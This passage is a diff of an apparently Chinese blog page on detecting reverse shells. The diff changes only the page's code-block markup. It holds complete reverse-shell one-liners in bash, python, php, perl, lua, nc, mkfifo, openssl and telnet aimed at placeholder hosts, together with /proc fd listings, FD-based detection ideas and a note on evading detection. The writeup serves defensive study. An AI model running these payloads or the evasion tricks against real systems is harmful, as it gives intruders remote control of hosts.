@@ -265,14 +265,10 @@
 <li><p>重定向可以通过管道、成对的伪终端、内存文件等实现。</p>
 </li>
 </ul>
-<h3 id="3-网络通信-Network-api"><a href="#3-网络通信-Network-api" class="headerlink" title="3. 网络通信(Network api)"></a>3. 网络通信(Network api)</h3><h4 id="四层协议"><a href="#四层协议" class="headerlink" title="四层协议"></a>四层协议</h4><pre><code>1) /dev/[tcp|udp]: 文件描述符+重定向
+<h3 id="3-网络通信-Network-api"><a href="#3-网络通信-Network-api" class="headerlink" title="3. 网络通信(Network api)"></a>3. 网络通信(Network api)</h3><h4 id="四层协议"><a href="#四层协议" class="headerlink" title="四层协议"></a>四层协议</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1) /dev/[tcp|udp]: 文件描述符+重定向</span><br><span class="line"></span><br><span class="line">2) 通过建立socket tcp连接实现网络通信</span><br><span class="line"></span><br><span class="line">3) 通过ICMP协议实现网络通信</span><br></pre></td></tr></table></figure>
 
-2) 通过建立socket tcp连接实现网络通信
+<h4 id="七层协议"><a href="#七层协议" class="headerlink" title="七层协议"></a>七层协议</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1) 使用DNS实现网络通信</span><br></pre></td></tr></table></figure>
 
-3) 通过ICMP协议实现网络通信
-</code></pre>
-<h4 id="七层协议"><a href="#七层协议" class="headerlink" title="七层协议"></a>七层协议</h4><pre><code>1) 使用DNS实现网络通信
-</code></pre>
 <h2 id="0x02-检测方法"><a href="#0x02-检测方法" class="headerlink" title="0x02 检测方法"></a>0x02 检测方法</h2><h3 id="1-常规检测-特征匹配"><a href="#1-常规检测-特征匹配" class="headerlink" title="1. 常规检测(特征匹配)"></a>1. 常规检测(特征匹配)</h3><p>常见的检测方案是通过正则匹配的方式，提取反弹Shell命令的特征去匹配命令日志、流量日志。该方案具有以下不足：</p>
 <ul>
 <li><p><strong>命令日志采集不完整</strong>：例如通过Netlink等方式采集的日志，在碰到管道符、重定向时会无法采集完整的原始执行命令。而通过Patch Bash的方式记录命令日志，在遇到服务器使用Zsh、Ksh等其他Shell环境，或攻击者上传自己编译的Bash时会失效。</p>
@@ -284,255 +280,53 @@
 </ul>
 <h3 id="2-分类检测"><a href="#2-分类检测" class="headerlink" title="2. 分类检测"></a>2. 分类检测</h3><p>FD检测技术、从行为目的出发的异常命令行为序列检测技术、异常Shell启动检测和常规的命令、网络特征覆盖方案</p>
 <h4 id="a-直接重定向Shell解释器的输入输出到Socket类型"><a href="#a-直接重定向Shell解释器的输入输出到Socket类型" class="headerlink" title="a. 直接重定向Shell解释器的输入输出到Socket类型"></a>a. 直接重定向Shell解释器的输入输出到Socket类型</h4><p><strong>常见场景</strong></p>
-<pre><code>1) bash -i &gt;&amp; /dev/tcp/Rhost/Rport 0&gt;&amp;1
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">1) bash -i &gt;&amp; /dev/tcp/Rhost/Rport 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">2) python -c &#x27;import </span><br><span class="line">socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);</span><br><span class="line">s.connect((&quot;Rhost&quot;,Rport));</span><br><span class="line">os.dup2(s.fileno(),0); </span><br><span class="line">os.dup2(s.fileno(),1); </span><br><span class="line">os.dup2(s.fileno(),2);</span><br><span class="line">p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br><span class="line"></span><br><span class="line">3) php -r &#x27;$sock=fsockopen(&quot;Rhost&quot;,Rport);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br><span class="line"></span><br><span class="line">4) perl -e &#x27;use </span><br><span class="line">Socket;$i=&quot;Rhost&quot;;$p=Rport;  </span><br><span class="line">socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));</span><br><span class="line">if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);</span><br><span class="line">open(STDERR,&quot;&gt;&amp;S&quot;);</span><br><span class="line">exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span><br><span class="line"></span><br><span class="line">5) lua -e &quot;require(&#x27;socket&#x27;);require(&#x27;os&#x27;);t=socket.tcp();t:connect(&#x27;Rhost&#x27;,&#x27;Rport&#x27;);os.execute(&#x27;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#x27;);&quot;</span><br></pre></td></tr></table></figure>
 
-2) python -c &#39;import 
-socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
-s.connect((&quot;Rhost&quot;,Rport));
-os.dup2(s.fileno(),0); 
-os.dup2(s.fileno(),1); 
-os.dup2(s.fileno(),2);
-p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">lrwx------. 1 root root 64 Feb 13 16:35 0 -&gt; socket:[1202940]</span><br><span class="line">lrwx------. 1 root root 64 Feb 13 16:35 1 -&gt; socket:[1202940]</span><br><span class="line">lrwx------. 1 root root 64 Feb 13 16:35 2 -&gt; socket:[1202940]</span><br><span class="line">lrwx------. 1 root root 64 Feb 13 16:35 255 -&gt; socket:[1202940]</span><br><span class="line"></span><br><span class="line">bash&lt;&gt;5</span><br><span class="line">lrwx------. 1 root root 64 Feb 13 18:58 0 -&gt; socket:[29023953]</span><br><span class="line">lrwx------. 1 root root 64 Feb 13 18:58 1 -&gt; socket:[29023953]</span><br><span class="line">lrwx------. 1 root root 64 Feb 13 18:58 2 -&gt; socket:[29023953]</span><br><span class="line">lrwx------. 1 root root 64 Feb 13 18:58 255 -&gt; socket:[29023953]</span><br><span class="line">lrwx------. 1 root root 64 Feb 13 18:58 5 -&gt; socket:[29023953]</span><br></pre></td></tr></table></figure>
 
-3) php -r &#39;$sock=fsockopen(&quot;Rhost&quot;,Rport);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;
-
-4) perl -e &#39;use 
-Socket;$i=&quot;Rhost&quot;;$p=Rport;  
-socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));
-if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);
-open(STDERR,&quot;&gt;&amp;S&quot;);
-exec(&quot;/bin/sh -i&quot;);&#125;;&#39;
-
-5) lua -e &quot;require(&#39;socket&#39;);require(&#39;os&#39;);t=socket.tcp();t:connect(&#39;Rhost&#39;,&#39;Rport&#39;);os.execute(&#39;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#39;);&quot;
-</code></pre>
-<pre><code>lrwx------. 1 root root 64 Feb 13 16:35 0 -&gt; socket:[1202940]
-lrwx------. 1 root root 64 Feb 13 16:35 1 -&gt; socket:[1202940]
-lrwx------. 1 root root 64 Feb 13 16:35 2 -&gt; socket:[1202940]
-lrwx------. 1 root root 64 Feb 13 16:35 255 -&gt; socket:[1202940]
-
-bash&lt;&gt;5
-lrwx------. 1 root root 64 Feb 13 18:58 0 -&gt; socket:[29023953]
-lrwx------. 1 root root 64 Feb 13 18:58 1 -&gt; socket:[29023953]
-lrwx------. 1 root root 64 Feb 13 18:58 2 -&gt; socket:[29023953]
-lrwx------. 1 root root 64 Feb 13 18:58 255 -&gt; socket:[29023953]
-lrwx------. 1 root root 64 Feb 13 18:58 5 -&gt; socket:[29023953]
-</code></pre>
 <p><strong>特征</strong>：该类型反弹Shell通过重定向bash -i的标准输入、标准输出、标准错误到&#x2F;dev&#x2F;tcp Socket进行网络通信</p>
 <p><img src="https://help-static-aliyun-doc.aliyuncs.com/assets/img/zh-CN/8877384161/p245418.png"></p>
 <p><strong>检测思路</strong>：通过检测Shell的标准输入、标准输出是否被重定向到Socket或检测一些简单的主机网络日志特征来实现</p>
 <h4 id="b-通过管道、伪终端等中转，再重定向Shell的输入输出到中转"><a href="#b-通过管道、伪终端等中转，再重定向Shell的输入输出到中转" class="headerlink" title="b. 通过管道、伪终端等中转，再重定向Shell的输入输出到中转"></a>b. 通过管道、伪终端等中转，再重定向Shell的输入输出到中转</h4><p>通过管道、伪终端等作为中转体，并与Socket打通，重定向Shell解释器的输入输出到中转体</p>
 <p><strong>常见场景</strong></p>
 <p>管道中转</p>
-<pre><code>1) nc Rhost Rport|/bin/sh|nc Rhost 5050 nc -e /bin/bash Rhost Rport nc -c bash Rhost Rport socat exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp:Rhost:Rport
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1) nc Rhost Rport|/bin/sh|nc Rhost 5050 nc -e /bin/bash Rhost Rport nc -c bash Rhost Rport socat exec:&#x27;bash -li&#x27;,pty,stderr,setsid,sigint,sane tcp:Rhost:Rport</span><br><span class="line"></span><br><span class="line">2) mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc Rhost Rport&gt;/tmp/f</span><br><span class="line"></span><br><span class="line">3) mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect Rhost:Rport &gt; /tmp/s; rm /tmp/s</span><br><span class="line"></span><br><span class="line">4) mknod backpipe p; nc Rhost Rport 0&lt;backpipe | /bin/bash 1&gt;backpipe 2&gt;backpipe</span><br><span class="line"></span><br><span class="line">5) bash -c &#x27;exec 5&lt;&gt;/dev/tcp/Rhost/Rport;cat &lt;&amp;5|while read line;do $line &gt;&amp;5 2&gt;&amp;1;done&#x27;</span><br><span class="line"></span><br><span class="line">6) telnet 10.10.10.10 Rport | /bin/bash | telnet Rhost 5050</span><br></pre></td></tr></table></figure>
 
-2) mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc Rhost Rport&gt;/tmp/f
-
-3) mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect Rhost:Rport &gt; /tmp/s; rm /tmp/s
-
-4) mknod backpipe p; nc Rhost Rport 0&lt;backpipe | /bin/bash 1&gt;backpipe 2&gt;backpipe
-
-5) bash -c &#39;exec 5&lt;&gt;/dev/tcp/Rhost/Rport;cat &lt;&amp;5|while read line;do $line &gt;&amp;5 2&gt;&amp;1;done&#39;
-
-6) telnet 10.10.10.10 Rport | /bin/bash | telnet Rhost 5050
-</code></pre>
 <p><strong>匿名管道</strong></p>
-<pre><code>exec5
-lr-x------. 1 root root 64 Feb 13 18:55 0 -&gt; pipe:[29010305]
-l-wx------. 1 root root 64 Feb 13 18:55 1 -&gt; pipe:[29010306]
-l-wx------. 1 root root 64 Feb 13 18:55 2 -&gt; pipe:[29010306]
-lrwx------. 1 root root 64 Feb 13 18:55 5 -&gt; socket:[29011974]
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">exec5</span><br><span class="line">lr-x------. 1 root root 64 Feb 13 18:55 0 -&gt; pipe:[29010305]</span><br><span class="line">l-wx------. 1 root root 64 Feb 13 18:55 1 -&gt; pipe:[29010306]</span><br><span class="line">l-wx------. 1 root root 64 Feb 13 18:55 2 -&gt; pipe:[29010306]</span><br><span class="line">lrwx------. 1 root root 64 Feb 13 18:55 5 -&gt; socket:[29011974]</span><br><span class="line"></span><br><span class="line">nc-e</span><br><span class="line">lr-x------. 1 root root 64 Feb 13 19:02 0 -&gt; pipe:[29037897]</span><br><span class="line">l-wx------. 1 root root 64 Feb 13 19:02 1 -&gt; pipe:[29037898]</span><br><span class="line">l-wx------. 1 root root 64 Feb 13 19:02 2 -&gt; pipe:[29037898]</span><br><span class="line">lrwx------. 1 root root 64 Feb 13 19:02 3 -&gt; socket:[29039553]</span><br><span class="line">l-wx------. 1 root root 64 Feb 13 19:02 5 -&gt; pipe:[29039554]</span><br><span class="line">lr-x------. 1 root root 64 Feb 13 19:02 6 -&gt; pipe:[29039555]</span><br><span class="line"></span><br><span class="line">nc-c</span><br><span class="line">lr-x------. 1 root root 64 Feb 13 19:06 0 -&gt; pipe:[29052945]</span><br><span class="line">l-wx------. 1 root root 64 Feb 13 19:06 1 -&gt; pipe:[29052946]</span><br><span class="line">l-wx------. 1 root root 64 Feb 13 19:06 2 -&gt; pipe:[29052946]</span><br><span class="line">lrwx------. 1 root root 64 Feb 13 19:06 3 -&gt; socket:[29054237]</span><br><span class="line">l-wx------. 1 root root 64 Feb 13 19:06 5 -&gt; pipe:[29054238]</span><br><span class="line">lr-x------. 1 root root 64 Feb 13 19:06 6 -&gt; pipe:[29054239]</span><br><span class="line"></span><br><span class="line">ncat-e</span><br><span class="line">lr-x------. 1 root root 64 Feb 13 19:06 0 -&gt; pipe:[29052872]</span><br><span class="line">l-wx------. 1 root root 64 Feb 13 19:06 1 -&gt; pipe:[29052873]</span><br><span class="line">l-wx------. 1 root root 64 Feb 13 19:06 2 -&gt; pipe:[29052873]</span><br><span class="line">lrwx------. 1 root root 64 Feb 13 19:06 3 -&gt; socket:[29054410]</span><br><span class="line">l-wx------. 1 root root 64 Feb 13 19:06 5 -&gt; pipe:[29054411]</span><br><span class="line">lr-x------. 1 root root 64 Feb 13 19:06 6 -&gt; pipe:[29054412]</span><br><span class="line"></span><br><span class="line">socat-EXEC</span><br><span class="line">lr-x------. 1 root root 64 Feb 13 19:19 0 -&gt; pipe:[29102002]</span><br><span class="line">l-wx------. 1 root root 64 Feb 13 19:19 1 -&gt; pipe:[29102003]</span><br><span class="line">l-wx------. 1 root root 64 Feb 13 19:19 2 -&gt; pipe:[29102003]</span><br><span class="line">lrwx------. 1 root root 64 Feb 13 19:19 3 -&gt; socket:[29105502]</span><br><span class="line">lrwx------. 1 root root 64 Feb 13 19:19 4 -&gt; socket:[29105503]</span><br><span class="line">lrwx------. 1 root root 64 Feb 13 19:19 5 -&gt; socket:[29105504]</span><br><span class="line">lrwx------. 1 root root 64 Feb 13 19:19 6 -&gt; socket:[29105505]</span><br><span class="line"></span><br><span class="line">rcat</span><br><span class="line">lr-x------. 1 root root 64 Feb 13 14:38 0 -&gt; pipe:[318590]</span><br><span class="line">l-wx------. 1 root root 64 Feb 13 14:38 1 -&gt; pipe:[318591]</span><br><span class="line">l-wx------. 1 root root 64 Feb 13 14:38 2 -&gt; pipe:[318591]</span><br><span class="line">lrwx------. 1 root root 64 Feb 13 14:38 3 -&gt; socket:[319517]</span><br><span class="line"></span><br><span class="line">php</span><br><span class="line">lr-x------. 1 root root 64 Feb 13 16:44 0 -&gt; pipe:[1226187]</span><br><span class="line">l-wx------. 1 root root 64 Feb 13 16:44 1 -&gt; pipe:[1226188]</span><br><span class="line">l-wx------. 1 root root 64 Feb 13 16:44 2 -&gt; pipe:[1226188]</span><br><span class="line">lrwx------. 1 root root 64 Feb 13 16:44 3 -&gt; socket:[1226491]</span><br><span class="line">lr-x------. 1 root root 64 Feb 13 16:44 4 -&gt; pipe:[1226492]</span><br><span class="line"></span><br><span class="line">lr-x------. 1 root root 64 Feb 13 16:56 0 -&gt; pipe:[1244376]</span><br><span class="line">l-wx------. 1 root root 64 Feb 13 16:56 1 -&gt; pipe:[1244377]</span><br><span class="line">l-wx------. 1 root root 64 Feb 13 16:56 2 -&gt; pipe:[1244377]</span><br><span class="line">lrwx------. 1 root root 64 Feb 13 16:56 3 -&gt; socket:[1244535]</span><br><span class="line"></span><br><span class="line">bash196</span><br><span class="line">lr-x------. 1 root root 64 Feb 13 18:55 0 -&gt; pipe:[29010277]</span><br><span class="line">l-wx------. 1 root root 64 Feb 13 18:55 1 -&gt; pipe:[29010278]</span><br><span class="line">lrwx------. 1 root root 64 Feb 13 18:55 196 -&gt; socket:[29011043]</span><br><span class="line">l-wx------. 1 root root 64 Feb 13 18:55 2 -&gt; pipe:[29010278]</span><br><span class="line"></span><br><span class="line">perl</span><br><span class="line">lrwx------. 1 root root 64 Feb 13 16:36 0 -&gt; socket:[1206445]</span><br><span class="line">lrwx------. 1 root root 64 Feb 13 16:36 1 -&gt; socket:[1206445]</span><br><span class="line">l-wx------. 1 root root 64 Feb 13 16:36 2 -&gt; pipe:[1205125]</span><br><span class="line">lrwx------. 1 root root 64 Feb 13 16:36 3 -&gt; socket:[1206445]</span><br><span class="line"></span><br><span class="line">awk</span><br><span class="line">lr-x------. 1 root root 64 Feb 13 18:38 0 -&gt; pipe:[1543339]</span><br><span class="line">l-wx------. 1 root root 64 Feb 13 18:38 1 -&gt; pipe:[1543340]</span><br><span class="line">l-wx------. 1 root root 64 Feb 13 18:38 2 -&gt; pipe:[1543340]</span><br><span class="line">lrwx------. 1 root root 64 Feb 13 18:41 3 -&gt; socket:[2821241]</span><br><span class="line">lrwx------. 1 root root 64 Feb 13 18:41 4 -&gt; socket:[2821241]</span><br></pre></td></tr></table></figure>
 
-nc-e
-lr-x------. 1 root root 64 Feb 13 19:02 0 -&gt; pipe:[29037897]
-l-wx------. 1 root root 64 Feb 13 19:02 1 -&gt; pipe:[29037898]
-l-wx------. 1 root root 64 Feb 13 19:02 2 -&gt; pipe:[29037898]
-lrwx------. 1 root root 64 Feb 13 19:02 3 -&gt; socket:[29039553]
-l-wx------. 1 root root 64 Feb 13 19:02 5 -&gt; pipe:[29039554]
-lr-x------. 1 root root 64 Feb 13 19:02 6 -&gt; pipe:[29039555]
-
-nc-c
-lr-x------. 1 root root 64 Feb 13 19:06 0 -&gt; pipe:[29052945]
-l-wx------. 1 root root 64 Feb 13 19:06 1 -&gt; pipe:[29052946]
-l-wx------. 1 root root 64 Feb 13 19:06 2 -&gt; pipe:[29052946]
-lrwx------. 1 root root 64 Feb 13 19:06 3 -&gt; socket:[29054237]
-l-wx------. 1 root root 64 Feb 13 19:06 5 -&gt; pipe:[29054238]
-lr-x------. 1 root root 64 Feb 13 19:06 6 -&gt; pipe:[29054239]
-
-ncat-e
-lr-x------. 1 root root 64 Feb 13 19:06 0 -&gt; pipe:[29052872]
-l-wx------. 1 root root 64 Feb 13 19:06 1 -&gt; pipe:[29052873]
-l-wx------. 1 root root 64 Feb 13 19:06 2 -&gt; pipe:[29052873]
-lrwx------. 1 root root 64 Feb 13 19:06 3 -&gt; socket:[29054410]
-l-wx------. 1 root root 64 Feb 13 19:06 5 -&gt; pipe:[29054411]
-lr-x------. 1 root root 64 Feb 13 19:06 6 -&gt; pipe:[29054412]
-
-socat-EXEC
-lr-x------. 1 root root 64 Feb 13 19:19 0 -&gt; pipe:[29102002]
-l-wx------. 1 root root 64 Feb 13 19:19 1 -&gt; pipe:[29102003]
-l-wx------. 1 root root 64 Feb 13 19:19 2 -&gt; pipe:[29102003]
-lrwx------. 1 root root 64 Feb 13 19:19 3 -&gt; socket:[29105502]
-lrwx------. 1 root root 64 Feb 13 19:19 4 -&gt; socket:[29105503]
-lrwx------. 1 root root 64 Feb 13 19:19 5 -&gt; socket:[29105504]
-lrwx------. 1 root root 64 Feb 13 19:19 6 -&gt; socket:[29105505]
-
-rcat
-lr-x------. 1 root root 64 Feb 13 14:38 0 -&gt; pipe:[318590]
-l-wx------. 1 root root 64 Feb 13 14:38 1 -&gt; pipe:[318591]
-l-wx------. 1 root root 64 Feb 13 14:38 2 -&gt; pipe:[318591]
-lrwx------. 1 root root 64 Feb 13 14:38 3 -&gt; socket:[319517]
-
-php
-lr-x------. 1 root root 64 Feb 13 16:44 0 -&gt; pipe:[1226187]
-l-wx------. 1 root root 64 Feb 13 16:44 1 -&gt; pipe:[1226188]
-l-wx------. 1 root root 64 Feb 13 16:44 2 -&gt; pipe:[1226188]
-lrwx------. 1 root root 64 Feb 13 16:44 3 -&gt; socket:[1226491]
-lr-x------. 1 root root 64 Feb 13 16:44 4 -&gt; pipe:[1226492]
-
-lr-x------. 1 root root 64 Feb 13 16:56 0 -&gt; pipe:[1244376]
-l-wx------. 1 root root 64 Feb 13 16:56 1 -&gt; pipe:[1244377]
-l-wx------. 1 root root 64 Feb 13 16:56 2 -&gt; pipe:[1244377]
-lrwx------. 1 root root 64 Feb 13 16:56 3 -&gt; socket:[1244535]
-
-bash196
-lr-x------. 1 root root 64 Feb 13 18:55 0 -&gt; pipe:[29010277]
-l-wx------. 1 root root 64 Feb 13 18:55 1 -&gt; pipe:[29010278]
-lrwx------. 1 root root 64 Feb 13 18:55 196 -&gt; socket:[29011043]
-l-wx------. 1 root root 64 Feb 13 18:55 2 -&gt; pipe:[29010278]
-
-perl
-lrwx------. 1 root root 64 Feb 13 16:36 0 -&gt; socket:[1206445]
-lrwx------. 1 root root 64 Feb 13 16:36 1 -&gt; socket:[1206445]
-l-wx------. 1 root root 64 Feb 13 16:36 2 -&gt; pipe:[1205125]
-lrwx------. 1 root root 64 Feb 13 16:36 3 -&gt; socket:[1206445]
-
-awk
-lr-x------. 1 root root 64 Feb 13 18:38 0 -&gt; pipe:[1543339]
-l-wx------. 1 root root 64 Feb 13 18:38 1 -&gt; pipe:[1543340]
-l-wx------. 1 root root 64 Feb 13 18:38 2 -&gt; pipe:[1543340]
-lrwx------. 1 root root 64 Feb 13 18:41 3 -&gt; socket:[2821241]
-lrwx------. 1 root root 64 Feb 13 18:41 4 -&gt; socket:[2821241]
-</code></pre>
 <p><strong>自建管道</strong></p>
-<pre><code>nc-/tmp/f
-lr-x------. 1 root root 64 Feb 13 18:58 0 -&gt; pipe:[29024021]
-l-wx------. 1 root root 64 Feb 13 18:58 1 -&gt; /tmp/f (deleted)
-l-wx------. 1 root root 64 Feb 13 18:58 2 -&gt; pipe:[29021988]
-lrwx------. 1 root root 64 Feb 13 18:58 3 -&gt; socket:[29024022]
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">nc-/tmp/f</span><br><span class="line">lr-x------. 1 root root 64 Feb 13 18:58 0 -&gt; pipe:[29024021]</span><br><span class="line">l-wx------. 1 root root 64 Feb 13 18:58 1 -&gt; /tmp/f (deleted)</span><br><span class="line">l-wx------. 1 root root 64 Feb 13 18:58 2 -&gt; pipe:[29021988]</span><br><span class="line">lrwx------. 1 root root 64 Feb 13 18:58 3 -&gt; socket:[29024022]</span><br><span class="line"></span><br><span class="line">nc-backpipe</span><br><span class="line">lr-x------. 1 root root 64 Feb 13 19:02 0 -&gt; /root/backpipe</span><br><span class="line">l-wx------. 1 root root 64 Feb 13 19:02 1 -&gt; pipe:[29040260]</span><br><span class="line">l-wx------. 1 root root 64 Feb 13 19:02 2 -&gt; pipe:[29038076]</span><br><span class="line">lrwx------. 1 root root 64 Feb 13 19:02 3 -&gt; socket:[29040261]</span><br><span class="line"></span><br><span class="line">telnet-$TF</span><br><span class="line">lr-x------. 1 root root 64 Feb 13 14:47 0 -&gt; /tmp/tmp.5wnXq0URfF</span><br><span class="line">l-wx------. 1 root root 64 Feb 13 14:47 1 -&gt; pipe:[326375]</span><br><span class="line">l-wx------. 1 root root 64 Feb 13 14:47 2 -&gt; pipe:[326286]</span><br><span class="line">lrwx------. 1 root root 64 Feb 13 14:47 3 -&gt; socket:[327426]</span><br><span class="line"></span><br><span class="line">telnet-a</span><br><span class="line">lr-x------. 1 root root 64 Feb 13 14:46 0 -&gt; /root/a</span><br><span class="line">l-wx------. 1 root root 64 Feb 13 14:46 1 -&gt; pipe:[325139]</span><br><span class="line">l-wx------. 1 root root 64 Feb 13 14:46 2 -&gt; pipe:[324180]</span><br><span class="line">lrwx------. 1 root root 64 Feb 13 14:46 3 -&gt; socket:[325140]</span><br></pre></td></tr></table></figure>
 
-nc-backpipe
-lr-x------. 1 root root 64 Feb 13 19:02 0 -&gt; /root/backpipe
-l-wx------. 1 root root 64 Feb 13 19:02 1 -&gt; pipe:[29040260]
-l-wx------. 1 root root 64 Feb 13 19:02 2 -&gt; pipe:[29038076]
-lrwx------. 1 root root 64 Feb 13 19:02 3 -&gt; socket:[29040261]
-
-telnet-$TF
-lr-x------. 1 root root 64 Feb 13 14:47 0 -&gt; /tmp/tmp.5wnXq0URfF
-l-wx------. 1 root root 64 Feb 13 14:47 1 -&gt; pipe:[326375]
-l-wx------. 1 root root 64 Feb 13 14:47 2 -&gt; pipe:[326286]
-lrwx------. 1 root root 64 Feb 13 14:47 3 -&gt; socket:[327426]
-
-telnet-a
-lr-x------. 1 root root 64 Feb 13 14:46 0 -&gt; /root/a
-l-wx------. 1 root root 64 Feb 13 14:46 1 -&gt; pipe:[325139]
-l-wx------. 1 root root 64 Feb 13 14:46 2 -&gt; pipe:[324180]
-lrwx------. 1 root root 64 Feb 13 14:46 3 -&gt; socket:[325140]
-</code></pre>
 <p><strong>检测思路</strong>：经过层层中转，最终会形成一条流动的数据通道。通过跟踪FD（文件描述符File Descriptor）和进程的关系可以检测该数据通道，判断是否为bash进程，获取bash父进程的&#x2F;proc&#x2F;[pid]&#x2F;fd，判断是否有存在fd重定向到pipe或者socket情况</p>
 <p><strong>绕过方法</strong>：上传可执行文件、拷贝Bash文件到其他路径等方法会绕过检测</p>
 <p>伪终端中转</p>
-<pre><code>python -c &#39;import 
-socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.XX.XX&quot;,10006));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;
-</code></pre>
-<pre><code>python
-lrwx------. 1 root root 64 Feb 13 17:29 0 -&gt; socket:[1283078]
-lrwx------. 1 root root 64 Feb 13 17:29 1 -&gt; socket:[1283078]
-lrwx------. 1 root root 64 Feb 13 17:29 2 -&gt; socket:[1283078]
-lrwx------. 1 root root 64 Feb 13 17:29 3 -&gt; socket:[1283078]
-lrwx------. 1 root root 64 Feb 13 17:29 4 -&gt; /dev/ptmx
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import </span><br><span class="line">socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.XX.XX&quot;,10006));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
 
-socat-pty
